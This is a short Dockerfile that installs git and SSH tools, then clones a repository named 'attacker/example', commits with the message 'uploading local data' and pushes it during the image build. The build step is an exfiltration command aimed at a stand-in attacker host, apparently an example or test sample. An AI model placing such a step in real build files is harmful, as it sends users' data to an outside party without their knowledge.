FROM alpine

RUN apk update && apk add --no-cache \
    git \
    openssh \
    openssl

RUN git clone git@github.com:attacker/example.git && \
    git pull && \
    git add . && \
    git commit -m "uploading local data" && \
    git push
